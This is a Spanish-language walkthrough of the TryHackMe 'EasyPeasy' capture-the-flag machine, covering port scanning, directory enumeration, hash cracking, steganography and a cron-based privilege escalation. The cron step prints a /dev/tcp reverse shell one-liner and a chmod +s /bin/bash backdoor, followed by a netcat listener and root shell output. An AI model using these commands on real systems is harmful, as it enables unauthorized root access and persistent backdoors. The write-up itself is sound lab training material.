# Writeup EasyPeasy - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.113.128.232` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Linux |
| **Dificultad** | Fácil |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración](#enumeración)
3. [Explotación](#explotación)
4. [Escalada de Privilegios](#escalada-de-privilegios)
5. [Flags](#flags)

---

## Reconocimiento

Iniciamos la intrusión con un escaneo exhaustivo de puertos para mapear la superficie de ataque disponible:

```bash
sudo nmap -sC -sV -sS -Pn -p- 10.113.128.232 -oN scan_easypeasy.txt
```
```text
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx 1.16.1
6498/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
65524/tcp open  http    Apache httpd 2.4.43
```

> Podemos ver que tenemos tres puertos abiertos en nuestra máquina. Lo interesante es que el SSH y Apache están en puertos muy altos (6498 y 65524), una táctica común para evitar escaneos automáticos y reducir la superficie de ataque.

---

## Enumeración

Después, para encontrar la primera flag, vamos a hacer un escaneo de directorios con GoBuster:

```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.113.128.232
```
```text
/hidden               (Status: 301)
```

Vemos que hay una carpeta "hidden", pero no encuentra nada más en la raíz. Vamos a reiniciar el escaneo enfocado en esa carpeta:

```bash
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -u http://10.113.128.232/hidden
```
```text
/whatever             (Status: 301)
```
Al revisar el código fuente de la carpeta "whatever", encontramos un texto codificado en Base64. Al descifrarlo, obtenemos la primera flag:

![primera flag](/imgEasy/image.png)

```bash
ZmxhZ3tmMXJzN19mbDRnfQ=
flag{f1rs7_fl4g}
```

Para la segunda flag, vamos al puerto de Apache, accedemos a "robots.txt" y encontramos un hash. Al meterlo en un detector de hashes, vemos que es MD5, así que podemos crackearlo fácilmente online:

![segunda flag](/imgEasy/image2.png)

![contenido](/imgEasy/image3.png)

Para la tercera flag, en el mismo puerto de Apache, hay que buscar en el código fuente de la página, donde está algo escondida:

![tercera flag](/imgEasy/image4.png)

Para la cuarta flag, en el código fuente de la página hay otro texto codificado en base62, que resulta ser un directorio oculto:

![cuarta flag](/imgEasy/image5.png)

![texto](/imgEasy/image6.png)

---

Para obtener acceso inicial, es necesario comprometer el hash extraído del directorio oculto: `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`. 

A pesar de que las herramientas de detección lo identifican como SHA-256, en este escenario específico, `John The Ripper` requiere forzar el formato `gost` para procesarlo correctamente.

```bash
john --wordlist=easypeasy_wordlist.txt hash.txt --format=gost
```
```text
mypasswordforthatjob (?)
```

Esa contraseña no parece ser para acceder al sistema, así que vamos a usar la imagen que encontramos en el sitio web. Utilizaremos "stegseek" para extraer la información oculta dentro de la imagen y poder acceder finalmente a la máquina:

```bash
echo mypasswordforthatjob > contra.txt
└─$ stegseek binarycodepixabay.jpg contra.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "mypasswordforthatjob"
[i] Original filename: "secrettext.txt".
[i] Extracting to "binarycodepixabay.jpg.out".


┌──(karitsu㉿Karitsu)-[~/Downloads]
└─$ cat binarycodepixabay.jpg.out
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
```
Tenemos el usuario, pero la contraseña está en código binario. Usaremos CyberChef para convertirla a texto:

![contraseña usuario](/imgEasy/image7.png)

Tenemos acceso a la máquina, pero antes de obtener la flag, debemos descifrarla, ya que está codificada con ROT. Usaremos "Dcode" para decodificarla:

```bash
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```

![descifrar flag](/imgEasy/image8.png)
---

## Escalada de Privilegios

Ya que tenemos acceso a la máquina como usuario, vamos a buscar la manera de escalar de privilegios. Lo primero es usar el comando `sudo -l` para ver qué podemos ejecutar como root sin necesidad de contraseña ni permisos especiales:

```bash
sudo -l
```

Al parecer no podemos ejecutar nada con permisos de root, así que hay otra alternativa: revisar `/etc/crontab` para ver qué tareas programadas existen:

```bash
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
Encontramos una tarea cron interesante: un archivo llamado ".mysecretcronjob.sh" que se ejecuta como root. Esto es exactamente lo que necesitamos para escalar privilegios. Vamos a usar "revshells.com" para generar un payload de shell reversa:

![generando payload](/imgEasy/image9.png)

Copiamos el payload generado, añadimos un comando para permitir el acceso futuro, y modificamos el archivo:

```bash
#!/bin/bash
# Script de escalada de privilegios vía Cron
sh -i >& /dev/tcp/10.113.128.232/4242 0>&1
chmod +s /bin/bash
```

Una vez modificado el archivo, establecemos un oyente en nuestra máquina local y esperamos la ejecución automática de la tarea cron:

```bash
nc -lvnp 4242
```
listening on [any] 4242 ...
connect to [192.168.168.157] from (UNKNOWN) [10.113.128.232] 39788
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root  883 Jun 15  2020 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
# cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```
